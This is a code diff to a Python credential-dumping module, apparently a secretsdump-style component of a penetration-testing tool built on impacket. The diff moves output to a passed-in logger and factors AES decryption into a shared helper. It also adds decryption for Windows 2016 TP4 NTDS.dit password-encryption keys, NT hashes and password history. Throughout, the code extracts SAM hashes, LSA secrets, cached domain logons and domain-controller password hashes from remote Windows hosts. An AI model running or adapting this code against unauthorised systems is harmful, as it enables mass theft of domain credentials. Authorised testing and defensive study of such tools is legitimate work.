@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# Copyright (c) 2003-2015 CORE Security Technologies
+# Copyright (c) 2003-2016 CORE Security Technologies
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -47,7 +47,6 @@ from struct import unpack, pack
 from collections import OrderedDict
 from binascii import unhexlify, hexlify
 from datetime import datetime
-from gevent import sleep
 import sys
 import random
 import hashlib
@@ -58,7 +57,6 @@ import string
 import codecs
 import os
 
-from core.logger import *
 from impacket import version, winregistry, ntlm
 from impacket.smbconnection import SMBConnection
 from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
@@ -68,7 +66,7 @@ from impacket.structure import Structure
 from impacket.nt_errors import STATUS_MORE_ENTRIES
 from impacket.ese import ESENT_DB
 from impacket.dcerpc.v5.dtypes import NULL
-
+from gevent import sleep
 from Crypto.Cipher import DES, ARC4, AES
 from Crypto.Hash import HMAC, MD4
 
@@ -785,6 +783,23 @@ class CryptoCommon:
         key2 = key[3] + key[0] + key[1] + key[2] + key[3] + key[0] + key[1]
         return self.transformKey(key1),self.transformKey(key2)
 
+    @staticmethod
+    def decryptAES(key, value, iv='\x00'*16):
+        plainText = ''
+        if iv != '\x00'*16:
+            aes256 = AES.new(key,AES.MODE_CBC, iv)
+
+        for index in range(0, len(value), 16):
+            if iv == '\x00'*16:
+                aes256 = AES.new(key,AES.MODE_CBC, iv)
+            cipherBuffer = value[index:index+16]
+            # Pad buffer to 16 bytes
+            if len(cipherBuffer) < 16:
+                cipherBuffer += '\x00' * (16-len(cipherBuffer))
+            plainText += aes256.decrypt(cipherBuffer)
+
+        return plainText
+
 
 class OfflineRegistry:
     def __init__(self, hiveFile = None, isRemote = False):
@@ -834,13 +849,14 @@ class OfflineRegistry:
             self.__registryHive.close()
 
 class SAMHashes(OfflineRegistry):
-    def __init__(self, samFile, bootKey, isRemote = False):
+    def __init__(self, samFile, bootKey, logger, isRemote = False):
         OfflineRegistry.__init__(self, samFile, isRemote)
         self.__samFile = samFile
         self.__hashedBootKey = ''
         self.__bootKey = bootKey
         self.__cryptoCommon = CryptoCommon()
         self.__itemsFound = {}
+        self.__logger = logger
 
     def MD5(self, data):
         md5 = hashlib.new('md5')
@@ -932,7 +948,7 @@ class SAMHashes(OfflineRegistry):
 
             answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash), hexlify(ntHash))
             self.__itemsFound[rid] = answer
-            print_att(answer)
+            self.__logger.results(answer)
 
     def export(self, fileName):
         if len(self.__itemsFound) > 0:
@@ -944,7 +960,7 @@ class SAMHashes(OfflineRegistry):
 
 
 class LSASecrets(OfflineRegistry):
-    def __init__(self, securityFile, bootKey, remoteOps = None, isRemote = False):
+    def __init__(self, securityFile, bootKey, logger, remoteOps = None, isRemote = False):
         OfflineRegistry.__init__(self,securityFile, isRemote)
         self.__hashedBootKey = ''
         self.__bootKey = bootKey
@@ -957,6 +973,7 @@ class LSASecrets(OfflineRegistry):
         self.__remoteOps = remoteOps
         self.__cachedItems = []
         self.__secretItems = []
+        self.__logger = logger
 
     def MD5(self, data):
         md5 = hashlib.new('md5')
@@ -969,22 +986,6 @@ class LSASecrets(OfflineRegistry):
         for i in range(1000):
             sha.update(value)
         return sha.digest()
-
-    def __decryptAES(self, key, value, iv='\x00'*16):
-        plainText = ''
-        if iv != '\x00'*16:
-            aes256 = AES.new(key,AES.MODE_CBC, iv)
-
-        for index in range(0, len(value), 16):
-            if iv == '\x00'*16:
-                aes256 = AES.new(key,AES.MODE_CBC, iv)
-            cipherBuffer = value[index:index+16]
-            # Pad buffer to 16 bytes
-            if len(cipherBuffer) < 16:
-                cipherBuffer += '\x00' * (16-len(cipherBuffer))
-            plainText += aes256.decrypt(cipherBuffer)
-
-        return plainText
 
     def __decryptSecret(self, key, value):
         # [MS-LSAD] Section 5.1.2
@@ -1022,7 +1023,7 @@ class LSASecrets(OfflineRegistry):
             # ToDo: There could be more than one LSA Keys
             record = LSA_SECRET(value)
             tmpKey = self.__sha256(self.__bootKey, record['EncryptedData'][:32])
-            plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
+            plainText = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
             record = LSA_SECRET_BLOB(plainText)
             self.__LSAKey = record['Secret'][52:][:32]
 
@@ -1059,7 +1060,7 @@ class LSASecrets(OfflineRegistry):
         if self.__vistaStyle is True:
             record = LSA_SECRET(value[1])
             tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
-            self.__NKLMKey = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
+            self.__NKLMKey = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
         else:
             self.__NKLMKey = self.__decryptSecret(self.__LSAKey, value[1])
 
@@ -1095,7 +1096,7 @@ class LSASecrets(OfflineRegistry):
             record = NL_RECORD(self.getValue(ntpath.join('\\Cache',value))[1])
             if record['CH'] != 16 * '\x00':
                 if self.__vistaStyle is True:
-                    plainText = self.__decryptAES(self.__NKLMKey[16:32], record['EncryptedData'], record['CH'])
+                    plainText = self.__cryptoCommon.decryptAES(self.__NKLMKey[16:32], record['EncryptedData'], record['CH'])
                 else:
                     plainText = self.__decryptHash(self.__NKLMKey, record['EncryptedData'], record['CH'])
                     pass
@@ -1108,7 +1109,7 @@ class LSASecrets(OfflineRegistry):
                 domainLong = plainText[:self.__pad(record['FullDomainLength'])].decode('utf-16le')
                 answer = "%s:%s:%s:%s:::" % (userName, hexlify(encHash), domainLong, domain)
                 self.__cachedItems.append(answer)
-                print_att(answer)
+                self.__logger.results(answer)
 
     def __printSecret(self, name, secretItem):
         # Based on [MS-LSAD] section 3.1.1.4
@@ -1186,12 +1187,13 @@ class LSASecrets(OfflineRegistry):
                 secret = "$MACHINE.ACC: %s:%s" % (hexlify(ntlm.LMOWFv1('','')), hexlify(md4.digest()))
 
         if secret != '':
-            print_att(secret)
+            self.__logger.results(secret)
             self.__secretItems.append(secret)
         else:
             # Default print, hexdump
+            self.__logger.results('{}:{}'.format(name, hexlify(secretItem)))
             self.__secretItems.append('%s:%s' % (name, hexlify(secretItem)))
-            print_att("{}:{}".format(name, hexlify(secretItem)))
+            #hexdump(secretItem)
 
     def dumpSecrets(self):
         if self.__securityFile is None:
@@ -1222,7 +1224,7 @@ class LSASecrets(OfflineRegistry):
                 if self.__vistaStyle is True:
                     record = LSA_SECRET(value[1])
                     tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
-                    plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
+                    plainText = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
                     record = LSA_SECRET_BLOB(plainText)
                     secret = record['Secret']
                 else:
@@ -1335,6 +1337,14 @@ class NTDSHashes:
             ('EncryptedHash','16s=""'),
         )
 
+    class CRYPTED_HASHW16(Structure):
+        structure = (
+            ('Header','8s=""'),
+            ('KeyMaterial','16s=""'),
+            ('Unknown','<L=0'),
+            ('EncryptedHash','32s=""'),
+        )
+
     class CRYPTED_HISTORY(Structure):
         structure = (
             ('Header','8s=""'),
@@ -1349,7 +1359,7 @@ class NTDSHashes:
             ('EncryptedHash',':'),
         )
 
-    def __init__(self, ntdsFile, bootKey, isRemote=False, history=False, noLMHash=True, remoteOps=None,
+    def __init__(self, ntdsFile, bootKey, logger, isRemote=False, history=False, noLMHash=True, remoteOps=None,
                  useVSSMethod=False, justNTLM=False, pwdLastSet=False, resumeSession=None, outputFileName=None):
         self.__bootKey = bootKey
         self.__NTDS = ntdsFile
@@ -1370,6 +1380,7 @@ class NTDSHashes:
         self.__savedSessionFile = resumeSession
         self.__resumeSessionFile = None
         self.__outputFileName = outputFileName
+        self.__logger = logger
 
     def getResumeSessionFile(self):
         return self.__resumeSessionFile
@@ -1391,19 +1402,32 @@ class NTDSHashes:
         
         if peklist is not None:
             encryptedPekList = self.PEKLIST_ENC(peklist)
-            md5 = hashlib.new('md5')
-            md5.update(self.__bootKey)
-            for i in range(1000):
-                md5.update(encryptedPekList['KeyMaterial'])
-            tmpKey = md5.digest()
-            rc4 = ARC4.new(tmpKey)
-            decryptedPekList = self.PEKLIST_PLAIN(rc4.encrypt(encryptedPekList['EncryptedPek']))
-            PEKLen = len(self.PEK_KEY())
-            for i in range(len( decryptedPekList['DecryptedPek'] ) / PEKLen ):
-                cursor = i * PEKLen
-                pek = self.PEK_KEY(decryptedPekList['DecryptedPek'][cursor:cursor+PEKLen])
-                logging.info("PEK # %d found and decrypted: %s", i, hexlify(pek['Key']))
-                self.__PEK.append(pek['Key'])
+            if encryptedPekList['Header'][:4] == '\x02\x00\x00\x00':
+                # Up to Windows 2012 R2 looks like header starts this way
+                md5 = hashlib.new('md5')
+                md5.update(self.__bootKey)
+                for i in range(1000):
+                    md5.update(encryptedPekList['KeyMaterial'])
+                tmpKey = md5.digest()
+                rc4 = ARC4.new(tmpKey)
+                decryptedPekList = self.PEKLIST_PLAIN(rc4.encrypt(encryptedPekList['EncryptedPek']))
+                PEKLen = len(self.PEK_KEY())
+                for i in range(len( decryptedPekList['DecryptedPek'] ) / PEKLen ):
+                    cursor = i * PEKLen
+                    pek = self.PEK_KEY(decryptedPekList['DecryptedPek'][cursor:cursor+PEKLen])
+                    logging.info("PEK # %d found and decrypted: %s", i, hexlify(pek['Key']))
+                    self.__PEK.append(pek['Key'])
+
+            elif encryptedPekList['Header'][:4] == '\x03\x00\x00\x00':
+                # Windows 2016 TP4 header starts this way
+                # Encrypted PEK Key seems to be different, but actually similar to decrypting LSA Secrets.
+                # using AES:
+                # Key: the bootKey
+                # CipherText: PEKLIST_ENC['EncryptedPek']
+                # IV: PEKLIST_ENC['KeyMaterial']
+                decryptedPekList = self.PEKLIST_PLAIN(self.__cryptoCommon.decryptAES(self.__bootKey, encryptedPekList['EncryptedPek'], encryptedPekList['KeyMaterial']))
+                self.__PEK.append(decryptedPekList['DecryptedPek'][4:][:16])
+                logging.info("PEK # 0 found and decrypted: %s", hexlify(decryptedPekList['DecryptedPek'][4:][:16]))
 
     def __removeRC4Layer(self, cryptedHash):
         md5 = hashlib.new('md5')
@@ -1448,6 +1472,13 @@ class NTDSHashes:
                     else:
                         userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
                     cipherText = self.CRYPTED_BLOB(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']]))
+
+                if cipherText['Header'][:4] == '\x13\x00\x00\x00':
+                    # Win2016 TP4 decryption is different
+                    pekIndex = hexlify(cipherText['Header'])
+                    plainText = self.__cryptoCommon.decryptAES(self.__PEK[int(pekIndex[8:10])], cipherText['EncryptedHash'][4:], cipherText['KeyMaterial'])
+                    haveInfo = True
+                else:
                     plainText = self.__removeRC4Layer(cipherText)
                     haveInfo = True
         else:
@@ -1550,7 +1581,13 @@ class NTDSHashes:
 
             if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
                 encryptedNTHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['unicodePwd']]))
-                tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
+                if encryptedNTHash['Header'][:4] == '\x13\x00\x00\x00':
+                    # Win2016 TP4 decryption is different
+                    encryptedNTHash = self.CRYPTED_HASHW16(unhexlify(record[self.NAME_TO_INTERNAL['unicodePwd']]))
+                    pekIndex = hexlify(encryptedNTHash['Header'])
+                    tmpNTHash = self.__cryptoCommon.decryptAES(self.__PEK[int(pekIndex[8:10])], encryptedNTHash['EncryptedHash'][:16], encryptedNTHash['KeyMaterial'])
+                else:
+                    tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
                 NTHash = self.__removeDESLayer(tmpNTHash, rid)
             else:
                 NTHash = ntlm.NTOWFv1('', '')
@@ -1572,7 +1609,7 @@ class NTDSHashes:
 
             if self.__pwdLastSet is True:
                 answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
-            print_att(answer)
+            self.__logger.results(answer)
 
             if self.__history:
                 LMHistory = []
@@ -1586,7 +1623,14 @@ class NTDSHashes:
 
                 if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
                     encryptedNTHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['ntPwdHistory']]))
-                    tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
+
+                    if encryptedNTHistory['Header'][:4] == '\x13\x00\x00\x00':
+                        # Win2016 TP4 decryption is different
+                        pekIndex = hexlify(encryptedNTHistory['Header'])
+                        tmpNTHistory = self.__cryptoCommon.decryptAES(self.__PEK[int(pekIndex[8:10])], encryptedNTHistory['EncryptedHash'], encryptedNTHistory['KeyMaterial'])
+                    else:
+                        tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
+
                     for i in range(0, len(tmpNTHistory) / 16):
                         NTHash = self.__removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                         NTHistory.append(NTHash)
@@ -1601,7 +1645,7 @@ class NTDSHashes:
                     answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHash))
                     if outputFile is not None:
                         self.__writeOutput(outputFile, answer + '\n')
-                    print_att(answer)
+                    self.__logger.results(answer)
         else:
             logging.debug('Decrypting hash for user: %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
             domain = None
@@ -1694,7 +1738,7 @@ class NTDSHashes:
 
             if self.__pwdLastSet is True:
                 answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
-            print_att(answer)
+            self.__logger.results(answer)
 
             if self.__history:
                 for i, (LMHashHistory, NTHashHistory) in enumerate(
@@ -1705,7 +1749,7 @@ class NTDSHashes:
                         lmhash = hexlify(LMHashHistory)
 
                     answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHashHistory))
-                    print_att(answer)
+                    self.__logger.results(answer)
                     if outputFile is not None:
                         self.__writeOutput(outputFile, answer + '\n')
 
@@ -1888,7 +1932,7 @@ class NTDSHashes:
                 logging.info('Kerberos keys grabbed')
 
             for itemKey in self.__kerberosKeys.keys():
-                print_att(itemKey)
+                print itemKey
 
         # And finally the cleartext pwds
         if len(self.__clearTextPwds) > 0:
@@ -1898,7 +1942,7 @@ class NTDSHashes:
                 logging.info('ClearText passwords grabbed')
 
             for itemKey in self.__clearTextPwds.keys():
-                print_att(itemKey)
+                print itemKey
 
         # Closing output file
         if self.__outputFileName is not None:
@@ -1921,9 +1965,8 @@ class NTDSHashes:
 
 
 class DumpSecrets:
-    def __init__(self, address, port, outputFile, smbConnection, kerberos=False):
-        self.__remoteAddr = address
-        self.__remotePort = port
+    def __init__(self, logger, outputFile, smbConnection, kerberos=False):
+        self.__logger = logger
         #self.__username = username
         #self.__password = password
         #self.__domain = domain
@@ -2009,8 +2052,8 @@ class DumpSecrets:
         if self.__bootKey is not None:
             try:
                 SAMFileName = self.__remoteOps.saveSAM()
-                self.__SAMHashes = SAMHashes(SAMFileName, self.__bootKey, isRemote = True)
-                print_succ('{}:{} Dumping SAM hashes (uid:rid:lmhash:nthash):'.format(self.__remoteAddr, self.__remotePort))
+                self.__SAMHashes = SAMHashes(SAMFileName, self.__bootKey, self.__logger, isRemote = True)
+                self.__logger.success('Dumping SAM hashes (uid:rid:lmhash:nthash)')
                 self.__SAMHashes.dump()
                 if self.__outputFileName is not None:
                     self.__SAMHashes.export(self.__outputFileName)
@@ -2022,8 +2065,8 @@ class DumpSecrets:
         if self.__bootKey is not None:
             try:
                 SECURITYFileName = self.__remoteOps.saveSECURITY()
-                print_succ('{}:{} Dumping LSA secrets:'.format(self.__remoteAddr, self.__remotePort))
-                self.__LSASecrets = LSASecrets(SECURITYFileName, self.__bootKey, self.__remoteOps, isRemote=True)
+                self.__logger.success('Dumping LSA secrets')
+                self.__LSASecrets = LSASecrets(SECURITYFileName, self.__bootKey, self.__logger, self.__remoteOps, isRemote=True)
                 self.__LSASecrets.dumpCachedHashes()
                 if self.__outputFileName is not None:
                     self.__LSASecrets.exportCached(self.__outputFileName)
@@ -2042,8 +2085,8 @@ class DumpSecrets:
         else:
             NTDSFileName = None
 
-        print_succ("{}:{} Dumping NTDS.dit secrets using the {} method (domain\\uid:rid:lmhash:nthash):".format(self.__remoteAddr, self.__remotePort, method.upper()))
-        self.__NTDSHashes = NTDSHashes(NTDSFileName, self.__bootKey, isRemote=True, history=history,
+        self.__logger.success("Dumping NTDS.dit secrets using the {} method (domain\\uid:rid:lmhash:nthash)".format(method.upper()))
+        self.__NTDSHashes = NTDSHashes(NTDSFileName, self.__bootKey, self.__logger, isRemote=True, history=history,
                                        noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                        useVSSMethod=vss, justNTLM=self.__justDCNTLM,
                                        pwdLastSet=pwdLastSet, resumeSession=self.__resumeFileName,
